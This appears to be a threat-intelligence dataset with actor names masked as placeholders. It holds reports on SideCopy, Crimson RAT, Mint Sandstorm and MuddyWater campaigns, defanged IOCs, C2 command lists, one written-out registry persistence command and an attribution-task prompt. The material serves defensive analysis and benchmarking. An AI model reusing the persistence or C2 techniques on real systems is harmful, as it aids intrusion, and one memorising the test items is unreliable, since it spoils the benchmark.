Chand” and various other random texts.  Later, the DLL will download two HTA files from the same compromised domain to begin its second stage process.  Both the HTA contain embedded files, this time an EXE and two DLLs.  One of the DLLs is executed in-memory, which drops the remaining two files into the public directory after decoding them. Persistence on the final payload is set beforehand via the Run registry key. One example:  REG ADD “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” /V “issas” /t REG_SZ /F /D “C:\Users\Public\issas\issas.exe”        Fig. 2 – Files dropped in one of the campaigns    Lastly, both the final payloads, which is AllaKore RAT, are executed and connected with the same IP but different port numbers for C2 communication. The final DLL is not side-loaded but is completely legitimate and old file.  An in-depth analysis of each stage can be checked in our previous blogs and whitepapers. It contains timers for timeout, reconnection, clipboard, and separate sockets for desktop, files, and keyboard. The functionality of AllaKore includes:    Gathering system information  Enumerating files and folders  Upload and execute files  Keylogging  Steal clipboard data  The Delphi-based AllaKore RATs have the following details campaign-wise:    Campaign        Internal Name   Compiler Timestamp  1       msmediaGPview  msmediarenderapp    06-Mar-2024  2       msvideolib  msrenderapp    18-Mar-2024  3       msvideolib  msrenderapp    01-Apr-2024  Initially, the RAT sends and receives ping-pong commands, listening to the C2 for commands to know that the connection is alive. Both RAT payloads run together, complementing each other, as seen in the network traffic below. Their sizes are also different: one is 3.2 MB, and the other almost doubles to 7 MB, like Double Action RAT. A connection ID based on the system information is created for each instance.        Fig. 3 – Network traffic for port 9828        Fig. 4 – Network traffic for port 6663    List of encrypted strings used for C2 communication in smaller-sized payloads:    Encrypted       Decrypted  7oYGAVUv7QVqOT0iUNI     SocketMain  7oYBFJGQ        OK  7o4AfMyIMmN     Info  7ooG0ewSx5K     PING  7ooGyOueQVE     PONG  7oYCkQ4hb550    Close  7oIBPsa66QyecyD NOSenha  7oIDcXX6y8njAD  Folder  7oIDaDhgXCBA    Files  7ooD/IcBeHXEooEVVuH4BB  DownloadFile  7o4H11u36Kir3n4M4NM     UploadFile  Sx+WZ+QNgX+TgltTwOyU4D  Unknown (Windows)  QxI/Ngbex4qIoVZBMB      Windows Vista  QxI/Ngbex46Q    Windows 7  QxI/Ngbex4aRKA  Windows 10  QxI/Ngbex4KTxLImkWK     Windows 8.1/10  Various file operations have been incorporated, including create, delete, execute, copy, move, rename, zip, and upload, which are part of the AllaKore agent. These commands were found in the bigger payload.        Fig. 5 – File move operation        Fig. 6 – Commands in the second payload    The DLL files dropped are not sideloaded by the AllaKore RAT, and they are legitimate files that could be later used for malicious purposes. These are Microsoft Windows-related libraries, but only a few contain a valid signature.    Dropped DLL Name          PDB    Description    Compilation Timestamp  msdr.dll        Windows.Management.Workplace.WorkplaceSettings.pdb      Windows Runtime WorkplaceSettings DLL   2071-08-19  braveservice.dll        dbghelp.pdb     Windows Image Helper    2052-02-25  salso.dll       D3d12core.pdb   Direct3D 12 Core Runtime        1981-03-18  salso.dll       OrtcEngine.pdb  Microsoft Skype ORTC Engine     2020-01-07  salso.dll       msvcp120d.amd64.pdb     Microsoft® C Runtime Library    2013-10-05  FI_Ejec13234.dll        IsAppRun.pdb    TODO:<> 2013-10-15  Decoys    Two decoy files have been observed, where one was used in previous campaigns in February-March 2023. The date in the document, “21 December 2022,” has been removed, and the bait’s name has been changed to indicate March 2024 – “Grant_of_Risk_and_HardShip_Allowances_Mar_24.pdf.” As the name suggests, it is an advisory from 2022 on allowance grants to Army officers under India’s Ministry of Defence. This is used in two of the three campaigns.        Fig. 7 – Decoy (1)    The second decoy is related to the same allowance category and mentions payment in arrears form. This is another old document used previously, dated 19 January 2023.        Fig. 8 – Decoy (2)    Infrastructure and Attribution    The compromised domains resolve to the same IP addresses used in previous campaigns, as seen with the passive DNS replication since last year.    IP      Compromised Domain      Campaign  151.106.97[.]183        inniaromas[.]com  ivinfotech[.]com    November 2023       revivelife.in   March 2024  vparking[.]online       April 2024  162.241.85[.]104        ssynergy[.]in   April 2023  elfinindia[.]com        May 2023  occoman[.]com   August 2023  sunfireglobal[.]in      October 2023  masterrealtors[.]in     November 2023  smokeworld[.]in March 2024  C2 servers of AllaKore RAT are registered in Germany to AS51167 – Contabo GmbH, commonly used by SideCopy. Based on the attack chain and arsenal used, these campaigns are attributed to SideCopy, which has high confidence and uses similar infrastructure to carry out the infection.    164.68.102[.]44 vmi1701584.contaboserver.net  213.136.94[.]11 vmi1761221.contaboserver.net  The following chart depicts telemetry hits observed for all three SideCopy campaigns related to AllaKore RAT. The first two campaigns indicate a spike twice in March, whereas the third campaign is observed during the second week of April.        Fig. 9 – SideCopy campaign hits    [PLACEHOLDER]    Many Crimson RAT samples are seen regularly on the VirusTotal platform, with a detection rate of around 40-50. In our threat hunting, we have found new samples but have had very few detections.        Fig. 10 – Infection Chain of [PLACEHOLDER]    Analyzing the infection chain to observe any changes, we found that the Crimson RAT samples are not embedded directly into the maldocs as they usually are. This time, the maldoc in the XLAM form contained three objects: the decoy and base64-encoded blobs.        Fig. 11 – Additional Functions in Macro    After extracting the VBA macro, we see additional functions for reading a file, decoding base64, and converting binary to string. The macro reads and decodes the two base64 blobs embedded inside the maldoc. This contains archived Crimson RAT executed samples, after which the decoy file is opened.        Fig. 12 – VBA infection flow    Crimson RAT    The final RAT payloads contain the same functionality where 22 commands for C2 communication are used. As the detection rate is typically high for this Crimson RAT, we see a low rate for both these samples. These .NET samples have compilation timestamp of 2024-03-17 and PDB as:    “C:\New folder\mulhiar tarsnib\mulhiar tarsnib\obj\Debug\mulhiar tarsnib.pdb”    Fig. 13 – Detection count on VT    No major changes were observed when the C2 commands were checked along with the process flow. IP of the C2 is 204.44.124[.]134, which tries to check the connection with 5 different ports – 9149, 15597, 18518, 26791, 28329. Below, you can find C2 commands for some of the recent samples (compile-timestamp-wise) of Crimson RAT, which uses similar 22 to 24 commands. All of these are not packed (except the last two) and have the same size range of 10-20 MB.        Fig. 14 – C2 commands of Crimson RAT for recent samples    As seen in BinDiff, similarity with previous samples is always more than 75%. Changes in the order of the command interpreted by the RAT were only found with numerical addition or splitting the command in two.        Fig. 15 – Comparing similarity between Crimson RAT variants    Additionally, two new samples that were obfuscated with Eziriz’s .NET Reactor were also found which are named ‘ShareX’ and ‘Analytics Based Card.’ [PLACEHOLDER] has used different packers and obfuscators like ConfuserEx, Crypto Obfusator, and Eazfuscator, in the past. Compared with the previous iteration, the regular ones contain 22-24 commands as usual, whereas the obfuscated one contains 40 commands. The C2, in this case, is juichangchi[.]online trying to connect with four ports – 909, 67, 65, 121. A few of these C2 commands don’t have functionality yet, but they are similar to the ones first documented by Proofpoint. The list of all 22 commands and their functionality can be found in our previous whitepaper on [PLACEHOLDER].        Fig. 16 – Comparison after deobufscation    Decoys    The maldoc named “Imp message from dgms” contains DGMS, which stands for India’s Directorate General of Mines Safety. The decoy document contains various points relating to land and urban policies associated with military or defense, showing its intended targeting of the Indian Government. Another maldoc named “All details” is empty but has a heading called posting list.        Fig. 17 – DGMS decoy    Crimson Keylogger    A malicious .NET file with a similar PDB naming convention to Crimson RAT was recently seen, with a compilation timestamp of 2023-06-14. Analysis led to a keylogger payload that captures all keyboard activity.    PDB: e:\vdhrh madtvin\vdhrh madtvin\obj\Debug\vdhrh madtvin.pdb  Apart from capturing each keystroke and writing it into a file, it collects the name of the current process in the foreground. Toggle keys are captured separately and based on key combinations; clipboard data is also copied to the storage file.        Fig. 18 – Crimson Keylogger    Correlation    Similar to the code overlaps seen previously between SideCopy and [PLACEHOLDER] in Linux-based payloads, based on the domain used as C2 by [PLACEHOLDER], we pivot to see passive DNS replications of the domain using Virus Total and Validin. The C2 for the above two packed samples resolved to different IPs – 176.107.182[.]55 and 162.245.191[.]214, as seen in the below timeline, giving us when they went live.        Fig. 19 – Timeline of C2 domain    This also leads us to two additional IP addresses: 155.94.209[.]4 and 162.255.119[.]207. The first one is communicating with a payload having detections of only 7/73 on Virus Total, whereas the latter is not associated with new malware. The malware seems to be another .NET Reactor packed payload with compile timestamp as 2039-02-24 but small (6.55 MB) compared to the Crimson RAT payloads.        Fig. 20 – Deobufscated AllaKore RAT    The default name of the sample is an Indian language word “Kuchbhi.pdb” meaning anything. After deobfuscation, we see C2 commands that are similar to the above Delphi-based AllaKore RAT deployed by SideCopy. Only this time it is in a .NET variant with the following five commands:    C2 Command      Function  LIST_DRIVES     Retrieve and send list of drives on the machine  LIST_FILES      Enumerate files and folder in the given path  UPLOAD_FILE     Download and execute file  PING    Listening to C2 and send PONG for live status  getinfo Send username, machine name and OS information  Persistence is set in two ways, run registry key or through the startup directory.    Overlap of code usability was found in SideCopy’s Linux-based stager payload of Ares RAT and that of [PLACEHOLDER]’s Linux-based python malware called Poseidon and other desktop utilities. Here we see similar code overlaps and possibly sharing of C2 infrastructure between the two groups. AllaKore RAT (open source) has been associated with SideCopy since its discovery in 2019 along with Action RAT payload. Similarly, Crimson RAT is linked to be an in-house toolset of [PLACEHOLDER].    Infrastructure and Attribution    Looking at the C2, the same target names used previously by [PLACEHOLDER] were identified that are running Windows Server 2012 and 2022 versions.    IP      ASN     Organization    Country Name  204.44.124[.]134        AS8100  QuadraNet Inc   United States   WIN-P9NRMH5G6M8  162.245.191[.]214       AS8100  QuadraNet Inc   United States   WIN-P9NRMH5G6M8  155.94.209[.]4  AS207083        Quadranet Inc   Netherlands     WIN-P9NRMH5G6M8  176.107.182[.]55        AS47987 Zemlyaniy Dmitro Leonidovich    Ukraine WIN-9YM6J4IRPC  Based on this correlation and previous attack chains, these campaigns are attributed to both [PLACEHOLDER] and SideCopy groups with high confidence, establishing yet another strong connection between them.    Conclusion    Persistent targeting of the Indian government and defense entities by Pakistan-linked APT groups has continued, where new operations have emerged with similar threats. SideCopy has deployed its well—associated AllaKore RAT in multiple campaigns, whereas its parent group, [PLACEHOLDER] ([PLACEHOLDER]), is continuously using Crimson RAT, T, making changes to evade detections.    As the threat landscape shifts due to various geopolitical events like the Israel-Iran conflict, India is bound to get targeted continuously. On the verge of India’s upcoming election, it is suggested that necessary precautions be taken and that people stay protected amidst the increasing cybercrime.
https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/	Since November 2023, Microsoft has observed a distinct subset of [PLACEHOLDER] targeting high-profile individuals working on Middle Eastern affairs at universities and research organizations in Belgium, France, Gaza, Israel, the United Kingdom, and the United States. In this campaign, [PLACEHOLDER] used bespoke phishing lures in an attempt to socially engineer targets into downloading malicious files. In a handful of cases, Microsoft observed new post-intrusion tradecraft including the use of a new, custom backdoor called MediaPl.    Operators associated with this subgroup of [PLACEHOLDER] are patient and highly skilled social engineers whose tradecraft lacks many of the hallmarks that allow users to quickly identify phishing emails. In some instances of this campaign, this subgroup also used legitimate but compromised accounts to send phishing lures. Additionally, [PLACEHOLDER] continues to improve and modify the tooling used in targets’ environments, activity that might help the group persist in a compromised environment and better evade detection.    [PLACEHOLDER] (which overlaps with the threat actor tracked by other researchers as APT35 and Charming Kitten) is a composite name used to describe several subgroups of activity with ties to the Islamic Revolutionary Guard Corps (IRGC), an intelligence arm of Iran’s military. Microsoft attributes the activity detailed in this blog to a technically and operationally mature subgroup of [PLACEHOLDER] that specializes in gaining access to and stealing sensitive information from high-value targets. This group is known to conduct resource-intensive social engineering campaigns that target journalists, researchers, professors, or other individuals with insights or perspective on security and policy issues of interest to Tehran.    These individuals, who work with or who have the potential to influence the intelligence and policy communities, are attractive targets for adversaries seeking to collect intelligence for the states that sponsor their activity, such as the Islamic Republic of Iran. Based on the identities of the targets observed in this campaign and the use of lures related to the Israel-Hamas war, it’s possible this campaign is an attempt to gather perspectives on events related to the war from individuals across the ideological spectrum.    In this blog, we share our analysis of the new [PLACEHOLDER] tradecraft and provide detection, hunting, and protection information. Organizations can also use the mitigations included in this blog to harden their attack surfaces against the tradecraft observed in this and other [PLACEHOLDER] campaigns. These mitigations are high-value measures that are effective ways to defend organizations from multiple threats, including [PLACEHOLDER], and are useful to any organization regardless of their threat model.    New [PLACEHOLDER] tradecraft  Microsoft observed new tactics, techniques, and procedures (TTPs) in this [PLACEHOLDER] campaign, notably the use of legitimate but compromised email accounts to send phishing lures, use of the Client for URL (curl) command to connect to [PLACEHOLDER]’s command-and-control (C2) server and download malicious files, and delivery of a new custom backdoor, MediaPl.    Social engineering  In this campaign, [PLACEHOLDER] masqueraded as high-profile individuals including as a journalist at a reputable news outlet. In some cases, the threat actor used an email address spoofed to resemble a personal email account belonging to the journalist they sought to impersonate and sent benign emails to targets requesting their input on an article about the Israel-Hamas war. In other cases, [PLACEHOLDER] used legitimate but compromised email accounts belonging to the individuals they sought to impersonate. Initial email messages did not contain any malicious content.    This tradecraft, namely the impersonation of a known individual, the use of highly bespoke phishing lures, and the use of wholly benign messages in the initial stages of the campaign, is likely an attempt to build rapport with targets and establish a level of trust before attempting to deliver malicious content to targets. Additionally, it’s likely that the use of legitimate but compromised email accounts, observed in a subset of this campaign, further bolstered [PLACEHOLDER]’s credibility, and might have played a role in the success of this campaign.    Delivery  If targets agreed to review the article or document referenced in the initial email, [PLACEHOLDER] followed up with an email containing a link to a malicious domain. In this campaign, follow up messages directed targets to sites such as cloud-document-edit[.]onrender[.]com, a domain hosting a RAR archive (.rar) file that purported to contain the draft document targets were asked to review. If opened, this .rar file decompressed into a double extension file (.pdf.lnk) with the same name. When launched, the .pdf.lnk file ran a curl command to retrieve a series of malicious files from attacker-controlled subdomains of glitch[.]me and supabase[.]co.    Microsoft observed multiple files downloaded to targets’ devices in this campaign, notably several .vbs scripts. In several instances, Microsoft observed a renamed version of NirCmd, a legitimate command line tool that allows a user to carry out a number of actions on a device without displaying a user interface, on a target’s device.    Persistence  In some cases, the threat actor used a malicious file, Persistence.vbs, to persist in targets’ environments. When run, Persistence.vbs added a file, typically named a.vbs, to the CurrentVersion\Run registry key. In other cases, [PLACEHOLDER] created a scheduled task to reach out to an attacker-controlled supabase[.]co domain and download a .txt file.    Intrusion chain leading to backdoors observed in the ongoing [PLACEHOLDER] campaign  Figure 1. Intrusion chain leading to backdoors observed in the ongoing [PLACEHOLDER] campaign  Collection  Activity observed in this campaign suggests that [PLACEHOLDER] wrote activity from targets’ devices to a series of text files, notably one named documentLoger.txt.    In addition to the activity detailed above, in some cases, [PLACEHOLDER] dropped MischiefTut or MediaPl, custom backdoors.    MediaPl backdoor  MediaPl is a custom backdoor capable of sending encrypted communications to its C2 server. MediaPl is configured to masquerade as Windows Media Player, an application used to store and play audio and video files. To this end, [PLACEHOLDER] typically drops this file in C:\\Users\\[REDACTED] \\AppData\\Local\\Microsoft\\Media Player\\MediaPl.dll. When MediaPl.dll is run with the path of an image file provided as an argument, it launches the image in Windows Photo application and also parses the image for C2 information. Communications to and from MediaPl’s C2 server are AES CBC encrypted and Base64 encoded. As of this writing, MediaPl can terminate itself, can pause and retry communications with its C2 server, and launch command(s) it has received from the C2 using the _popen function.    MischiefTut  MischiefTut is a custom backdoor implemented in PowerShell with a set of basic capabilities. MischiefTut can run reconnaissance commands, write outputs to a text file and, ostensibly, send outputs back to adversary-controlled infrastructure. MischiefTut can also be used to download additional tools on a compromised system.    Implications  The ability to obtain and maintain remote access to a target’s system can enable [PLACEHOLDER] to conduct a range of activities that can adversely impact the confidentiality of a system. Compromise of a targeted system can also create legal and reputational risks for organizations affected by this campaign. In light of the patience, resources, and skills observed in campaigns attributed to this subgroup of [PLACEHOLDER], Microsoft continues to update and augment our detection capabilities to help customers defend against this threat.    Recommendations  Microsoft recommends the following mitigations to reduce the impact of activity associated with recent [PLACEHOLDER] campaigns.    Use the Attack Simulator in Microsoft Defender for Office 365 to organize realistic, yet safe, simulated phishing and password attack campaigns in your organization by training end-users against clicking URLs in unsolicited messages and disclosing their credentials. Training should include checking for poor spelling and grammar in phishing emails or the application’s consent screen as well as spoofed app names, logos and domain URLs appearing to originate from legitimate applications or companies. Note that Attack Simulator testing only supports phishing emails containing links at this time.  Encourage users to use Microsoft Edge and other web browsers that support SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware. Turn on network protection to block connections to malicious domains and IP addresses.  Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants.  Microsoft Defender XDR customers can also turn on attack surface reduction rules to harden their environments against techniques used by this [PLACEHOLDER] subgroup. These rules, which can be configured by all Microsoft Defender Antivirus customers and not just those using the EDR solution, offer significant protection against the tradecraft discussed in this report.    Block executable files from running unless they meet a prevalence, age, or trusted list criterion.  Block JavaScript or VBScript from launching downloaded executable content.  Block execution of potentially obfuscated scripts.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Since November 2023, Microsoft has observed a distinct subset of [PLACEHOLDER] targeting high-profile individuals working on Middle Eastern affairs at universities and research organizations in Belgium, France, Gaza, Israel, the United Kingdom, and the United States. In this campaign, [PLACEHOLDER] used bespoke phishing lures in an attempt to socially engineer targets into downloading malicious files. In a handful of cases, Microsoft observed new post-intrusion tradecraft including the use of a new, custom backdoor called MediaPl.    Operators associated with this subgroup of [PLACEHOLDER] are patient and highly skilled social engineers whose tradecraft lacks many of the hallmarks that allow users to quickly identify phishing emails. In some instances of this campaign, this subgroup also used legitimate but compromised accounts to send phishing lures. Additionally, [PLACEHOLDER] continues to improve and modify the tooling used in targets’ environments, activity that might help the group persist in a compromised environment and better evade detection.    [PLACEHOLDER] (which overlaps with the threat actor tracked by other researchers as APT35 and Charming Kitten) is a composite name used to describe several subgroups of activity with ties to the Islamic Revolutionary Guard Corps (IRGC), an intelligence arm of Iran’s military. Microsoft attributes the activity detailed in this blog to a technically and operationally mature subgroup of [PLACEHOLDER] that specializes in gaining access to and stealing sensitive information from high-value targets. This group is known to conduct resource-intensive social engineering campaigns that target journalists, researchers, professors, or other individuals with insights or perspective on security and policy issues of interest to Tehran.    These individuals, who work with or who have the potential to influence the intelligence and policy communities, are attractive targets for adversaries seeking to collect intelligence for the states that sponsor their activity, such as the Islamic Republic of Iran. Based on the identities of the targets observed in this campaign and the use of lures related to the Israel-Hamas war, it’s possible this campaign is an attempt to gather perspectives on events related to the war from individuals across the ideological spectrum.    In this blog, we share our analysis of the new [PLACEHOLDER] tradecraft and provide detection, hunting, and protection information. Organizations can also use the mitigations included in this blog to harden their attack surfaces against the tradecraft observed in this and other [PLACEHOLDER] campaigns. These mitigations are high-value measures that are effective ways to defend organizations from multiple threats, including [PLACEHOLDER], and are useful to any organization regardless of their threat model.    New [PLACEHOLDER] tradecraft  Microsoft observed new tactics, techniques, and procedures (TTPs) in this [PLACEHOLDER] campaign, notably the use of legitimate but compromised email accounts to send phishing lures, use of the Client for URL (curl) command to connect to [PLACEHOLDER]’s command-and-control (C2) server and download malicious files, and delivery of a new custom backdoor, MediaPl.    Social engineering  In this campaign, [PLACEHOLDER] masqueraded as high-profile individuals including as a journalist at a reputable news outlet. In some cases, the threat actor used an email address spoofed to resemble a personal email account belonging to the journalist they sought to impersonate and sent benign emails to targets requesting their input on an article about the Israel-Hamas war. In other cases, [PLACEHOLDER] used legitimate but compromised email accounts belonging to the individuals they sought to impersonate. Initial email messages did not contain any malicious content.    This tradecraft, namely the impersonation of a known individual, the use of highly bespoke phishing lures, and the use of wholly benign messages in the initial stages of the campaign, is likely an attempt to build rapport with targets and establish a level of trust before attempting to deliver malicious content to targets. Additionally, it’s likely that the use of legitimate but compromised email accounts, observed in a subset of this campaign, further bolstered [PLACEHOLDER]’s credibility, and might have played a role in the success of this campaign.    Delivery  If targets agreed to review the article or document referenced in the initial email, [PLACEHOLDER] followed up with an email containing a link to a malicious domain. In this campaign, follow up messages directed targets to sites such as cloud-document-edit[.]onrender[.]com, a domain hosting a RAR archive (.rar) file that purported to contain the draft document targets were asked to review. If opened, this .rar file decompressed into a double extension file (.pdf.lnk) with the same name. When launched, the .pdf.lnk file ran a curl command to retrieve a series of malicious files from attacker-controlled subdomains of glitch[.]me and supabase[.]co.    Microsoft observed multiple files downloaded to targets’ devices in this campaign, notably several .vbs scripts. In several instances, Microsoft observed a renamed version of NirCmd, a legitimate command line tool that allows a user to carry out a number of actions on a device without displaying a user interface, on a target’s device.    Persistence  In some cases, the threat actor used a malicious file, Persistence.vbs, to persist in targets’ environments. When run, Persistence.vbs added a file, typically named a.vbs, to the CurrentVersion\Run registry key. In other cases, [PLACEHOLDER] created a scheduled task to reach out to an attacker-controlled supabase[.]co domain and download a .txt file.    Intrusion chain leading to backdoors observed in the ongoing [PLACEHOLDER] campaign  Figure 1. Intrusion chain leading to backdoors observed in the ongoing [PLACEHOLDER] campaign  Collection  Activity observed in this campaign suggests that [PLACEHOLDER] wrote activity from targets’ devices to a series of text files, notably one named documentLoger.txt.    In addition to the activity detailed above, in some cases, [PLACEHOLDER] dropped MischiefTut or MediaPl, custom backdoors.    MediaPl backdoor  MediaPl is a custom backdoor capable of sending encrypted communications to its C2 server. MediaPl is configured to masquerade as Windows Media Player, an application used to store and play audio and video files. To this end, [PLACEHOLDER] typically drops this file in C:\\Users\\[REDACTED] \\AppData\\Local\\Microsoft\\Media Player\\MediaPl.dll. When MediaPl.dll is run with the path of an image file provided as an argument, it launches the image in Windows Photo application and also parses the image for C2 information. Communications to and from MediaPl’s C2 server are AES CBC encrypted and Base64 encoded. As of this writing, MediaPl can terminate itself, can pause and retry communications with its C2 server, and launch command(s) it has received from the C2 using the _popen function.    MischiefTut  MischiefTut is a custom backdoor implemented in PowerShell with a set of basic capabilities. MischiefTut can run reconnaissance commands, write outputs to a text file and, ostensibly, send outputs back to adversary-controlled infrastructure. MischiefTut can also be used to download additional tools on a compromised system.    Implications  The ability to obtain and maintain remote access to a target’s system can enable [PLACEHOLDER] to conduct a range of activities that can adversely impact the confidentiality of a system. Compromise of a targeted system can also create legal and reputational risks for organizations affected by this campaign. In light of the patience, resources, and skills observed in campaigns attributed to this subgroup of [PLACEHOLDER], Microsoft continues to update and augment our detection capabilities to help customers defend against this threat.    Recommendations  Microsoft recommends the following mitigations to reduce the impact of activity associated with recent [PLACEHOLDER] campaigns.    Use the Attack Simulator in Microsoft Defender for Office 365 to organize realistic, yet safe, simulated phishing and password attack campaigns in your organization by training end-users against clicking URLs in unsolicited messages and disclosing their credentials. Training should include checking for poor spelling and grammar in phishing emails or the application’s consent screen as well as spoofed app names, logos and domain URLs appearing to originate from legitimate applications or companies. Note that Attack Simulator testing only supports phishing emails containing links at this time.  Encourage users to use Microsoft Edge and other web browsers that support SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware. Turn on network protection to block connections to malicious domains and IP addresses.  Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants.  Microsoft Defender XDR customers can also turn on attack surface reduction rules to harden their environments against techniques used by this [PLACEHOLDER] subgroup. These rules, which can be configured by all Microsoft Defender Antivirus customers and not just those using the EDR solution, offer significant protection against the tradecraft discussed in this report.    Block executable files from running unless they meet a prevalence, age, or trusted list criterion.  Block JavaScript or VBScript from launching downloaded executable content.  Block execution of potentially obfuscated scripts.
https://www.deepinstinct.com/blog/darkbeatc2-the-latest-muddywater-attack-framework	Despite the large number of Iranian cyber attacks against Israeli organizations, which has significantly increased since the start of the “Swords of Iron War,” Israeli reporting about the attacks has been limited to mainstream news reports without technical details beyond general IOCs.    Most of the technical details about the attacks are exclusively being shared by international companies outside of Israel even though most of the incident response is done by local Israeli companies and the Israel National Cyber Directorate (INCD).    For example, in mid-February 2024, Google shared a recap of some of the events that have occurred since the start of 2024. The report includes information not reported by the local news or the INCD.    When the INCD does share alerts about malicious cyber activity against Israeli companies, which is infrequent, they’re vague on specifics. Recently, they shared an alert about multiple state-sponsored groups targeting “mostly” a few specific sectors.    The alert also includes a Yara rule set and a long list of IOCs without any additional context.    Providing IOCs without any context might help for a day, but there is a reason why they are located at the bottom of the “Pyramid of Pain,” a term we will often refer to in this blog.    Going Through a Pile of Garbage to Find Golden Nuggets  While the shared information is not enough to be useful for the companies that are being targeted, let’s do a dumpster dive into what has been shared and see if we can salvage anything useful.    The Yara rules are for various wipers based on the rule’s names. Although no hashes or additional info is provided, it is possible to link the rules to the following specific attacks:    BiBi wiper by KarMa  Homeland Justice wiper targeting Albanian Parliament (2022)  Homeland Justice wiper targeting Albania’s Institute of Statistics (INSTAT)  Google links KarMa to DEV-0842/BanishedKitten. In Microsoft’s investigation into the 2022 Albanian government attacks, they “assessed with high confidence that multiple Iranian actors participated in this attack.” Microsoft states, “DEV-0842 deployed the ransomware and wiper malware,” while three additional groups participated in the attack. Each group was responsible for a different step in the “Cyber Kill Chain.”    Additionally, Microsoft links all the different groups in this attack to the Iranian Ministry of Intelligence and Security (MOIS).    fig01-threat-actors-behind-the-attack.png  Figure 1: Threat actors behind the attack against the Albanian government in 2022. (Source: Microsoft)  In another investigation into the 2022 Albanian government attack, Mandiant also raised “the possibility of a cross-team collaboration.”    The IOC list shared by INCD includes hashes for seven files, only three of which are publicly available. Among those publicly available, two are generic webshells from 2020.    The last file is also a webshell. But unlike the other two, it is not a generic webshell but a variant of the FoxShell used by ScarredManticore/DEV-0861/ShroudedSnooper, which Microsoft observed participating in the 2022 cyberattack on the Albanian government.    If we make an analogy to medical terminology, webshell is just a symptom, and trying to prevent webshells by hash values is easily bypassed. Therefore, it is not considered as a prevention capability.    Out of the three domains shared by INCD, only one is publicly known to be directly related to Iranian activity. The domain vatacloud[.]com was used by DEV-1084 (DarkBit) in their attack against the Technion in February 2023. According to Microsoft, “DEV-1084 likely worked in partnership with MERCURY.”    The last of the IOCs includes 31 IP addresses without a description.    Out of those, Deep Instinct could not identify any known malicious activity in 11 IP addresses.    Another 11 IP addresses are known to be associated with [PLACEHOLDER] from previous campaigns,    such as SimpleHarm, PhonyC2, and MuddyC2Go (1, 2).    The nine remaining IP addresses are most likely also related to [PLACEHOLDER]. Moreover, we believe that these IPs host the latest tools used by the threat actor and their latest C2 framework, which we named “DarkBeatC2.”    Now, let’s examine the additional context surrounding the above findings to see the full picture.    Presenting “Lord Nemesis”  “Lord Nemesis” is the latest, “all the rage” Iranian “faketivist” operation.    fig02-faketivism.png  Figure 2: Faketivism definition.  Due to the lack of transparency and context in reports on most Iranian cyber operations against Israel, the following rare sighting of a detailed report about a recent supply-chain attack amplifies why context is so important.    A unique report from OP Innovate details how the attackers, who call themselves “Lord Nemesis,” managed to access multiple organizations by compromising a single IT provider named “Rashim.”    According to the report, “One of the critical factors that allowed Lord Nemesis to extend its attack beyond Rashim was the company’s practice of maintaining an admin user account on some of its customer systems. By hijacking this admin account, the attackers were able to access numerous organizations by using their VPN that relied on the Michlol CRM, potentially compromising the security of these institutions and putting their data at risk.”    While the report contains additional context that explains how the attackers operated after they gained initial access, it does not explain how the attack was attributed to “Nemesis Kitten,” as mentioned at the beginning of their report.    According to Microsoft, “Nemesis Kitten” is DEV-0270 (Cobalt Mirage, TunnelVision), a subgroup of the Iranian threat actor Mint Sandstorm (PHOSPHORUS, APT35, Charming Kitten), which we have previously observed exploiting Exchange servers.    While “Mint Sandstorm” has been linked to the Iranian IRGC, DEV-0270 is a private subcontractor known as “SecNerd” or “Najee Technology.”    However, the most important detail from Op Innovate’s blog is the following: “To instill fear in his victims and demonstrate the extent of his access, ‘Lord Nemesis,’ contacted a list of Rashim’s users and colleagues via Rashim’s email system on March 4th. This communication occurred four months after the initial breach of Rashim’s infrastructure, highlighting the attacker’s prolonged presence within the system.”    This is important because if “Lord Nemesis” were able to breach Rashim’s email system, they might have breached the email systems of Rashim’s customers using the admin accounts that now we know they obtained from “Rashim,” thanks to Op Innovate’s reporting.    So, why is this so important? Read on.    Back to [PLACEHOLDER]  We have reported about [PLACEHOLDER] activity numerous times.    Despite the reports, the threat actor only slightly changes its core TTPs, as the “Pyramid of Pain” predicted. While occasionally switching to a new remote administration tool or changing their C2 framework (due to a previous one being leaked), [PLACEHOLDER]’s methods remain constant, as described in our very first blog about the threat actor.      fig03-current-[PLACEHOLDER]-campign.png  Figure 3: Updated [PLACEHOLDER] campaign overview.  In a recent security brief by Proofpoint, [PLACEHOLDER] (TA450) was observed sending PDF attachments from the email of a compromised Israeli company.    Those PDF attachments contained links to various web hosting services where users could download an archive containing a remote administration tool, as shown in Figure 3 above.    However, one of those web hosting providers – “Egnyte,” with a “salary.egnyte[.]com” subdomain – was new and not previously known to be in use by [PLACEHOLDER].    While this change seems minor and insignificant, it is the exact opposite when given additional context. At the same time Proofpoint reported this campaign, Deep Instinct observed a similar campaign using a different subdomain, “kinneretacil.egnyte[.]com.” The subdomain refers to the domain “kinneret.ac.il,” which is an Israeli higher education college.    Kinneret is a customer of “Rashim,” thanks to the information that was shared by OP Innovate. This led us to believe that kinneretacil.egnyte[.]com might be part of their infrastructure compromised by “Lord Nemesis,” especially since it shared username “ori ben-dor” which looks like an authentic Israeli name (see Figure 4).    fig04-uploader-information-at-kinneretacil.jfif  Figure 4: Uploader information at kinneretacil.egnyte[.]com  Thanks to the context given by Proofpoint, it appears the Egnyte account was not compromised but rather created by [PLACEHOLDER]. This can be seen by the lack of creativity in the uploader name (“Shared by gsdfg gsg”) in the instance Proofpoint observed (See Figure 5).    fig05-uploader_info-salary.png  Figure 5: Uploader information at salary.egnyte[.]com  Since [PLACEHOLDER] used a compromised email account to spread the links to salary.egnyte[.]com, this was also likely with the kinneretacil.egnyte[.]com links, although we don’t have direct evidence.    [PLACEHOLDER] may have used the “Kinneret” email account to distribute these links, exploiting the trust 